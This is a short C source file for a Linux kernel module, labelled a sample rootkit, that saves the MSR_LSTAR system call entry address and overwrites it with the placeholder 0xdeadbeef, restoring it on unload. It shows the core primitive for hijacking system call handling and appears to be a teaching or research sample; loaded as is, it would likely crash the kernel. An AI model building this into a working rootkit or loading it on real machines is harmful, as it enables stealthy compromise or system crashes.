#include "linux/linkage.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Krzysztof Zdulski");
MODULE_DESCRIPTION("Sample rootkit - syscall handler (MSR LSTAR)");
MODULE_VERSION("0.01");

static void *org_msr;

static inline void *get_syscall_64_handler(void)
{
    unsigned long system_call_entry;
    rdmsrl(MSR_LSTAR, system_call_entry);
    return (void *)system_call_entry;
}

static inline void set_syscall_64_handler(void *val)
{
    wrmsrl(MSR_LSTAR, (unsigned long)val);
}


static int __init lkm_example_init(void)
{
    printk(KERN_INFO "loading module syscall handler");
    org_msr = get_syscall_64_handler();
    set_syscall_64_handler((void *)0xdeadbeef);
    return 0;
}

static void __exit lkm_example_exit(void)
{
    printk(KERN_INFO "unloading module syscall handler");
    set_syscall_64_handler(org_msr);
}

module_init(lkm_example_init);
module_exit(lkm_example_exit);
